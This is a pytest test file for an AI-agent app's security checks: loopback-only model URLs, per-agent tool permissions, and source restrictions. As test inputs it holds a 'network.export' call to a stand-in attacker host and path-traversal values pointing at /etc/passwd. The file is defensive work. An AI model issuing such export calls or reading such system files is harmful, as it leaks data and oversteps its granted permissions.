import pytest
from pydantic import ValidationError
from app.agents import DEFAULT_AGENTS
from app.config import Settings
from app.llm import LocalLLM
from app.models import AgentCreate, ToolCall
from app.security import PermissionDenied, authorize_tool, is_loopback_url, validate_configuration


@pytest.mark.parametrize("url", ["https://hosted.example/v1", "http://192.168.1.10/v1", "http://127.0.0.1.attacker.invalid/v1", "http://user:secret@localhost/v1", "file:///tmp/model", "http://0.0.0.0:11434/v1"])
def test_external_inference_and_tricky_urls_blocked(url):
    assert not is_loopback_url(url)
    assert LocalLLM(Settings(llm_base_url=url)).config_error


@pytest.mark.parametrize("url", ["http://127.0.0.1:11434/v1", "http://localhost:8000", "http://[::1]:8000/v1"])
def test_loopback_urls_allowed(url):
    assert is_loopback_url(url)


def test_network_exfiltration_blocked_for_every_agent():
    for agent in DEFAULT_AGENTS:
        with pytest.raises(PermissionDenied):
            authorize_tool(agent, ToolCall(name="network.export", arguments={"destination": "https://attacker.invalid"}))


def test_validated_agent_cannot_escalate_role_or_change_source():
    with pytest.raises(PermissionDenied):
        validate_configuration(AgentCreate(name="Demo", role="hr", purpose="Read policy safely", tools=["analyze_invoices"], source="handbook.txt"))
    with pytest.raises(PermissionDenied):
        validate_configuration(AgentCreate(name="Demo", role="hr", purpose="Read policy safely", tools=["read_policy"], source="invoices.csv"))
    with pytest.raises(ValidationError):
        AgentCreate(name="Demo", role="hr", purpose="Read policy safely", tools=["network.export"], source="handbook.txt")
    with pytest.raises(PermissionDenied):
        validate_configuration(AgentCreate(name="Demo", role="hr", purpose="Read policy safely", tools=["read_policy"], source="../../etc/passwd"))


def test_allowed_tool_cannot_accept_generated_path_or_code():
    authorize_tool(DEFAULT_AGENTS[0], ToolCall(name="read_policy"))
    with pytest.raises(PermissionDenied):
        authorize_tool(DEFAULT_AGENTS[0], ToolCall(name="read_policy", arguments={"path": "/etc/passwd"}))
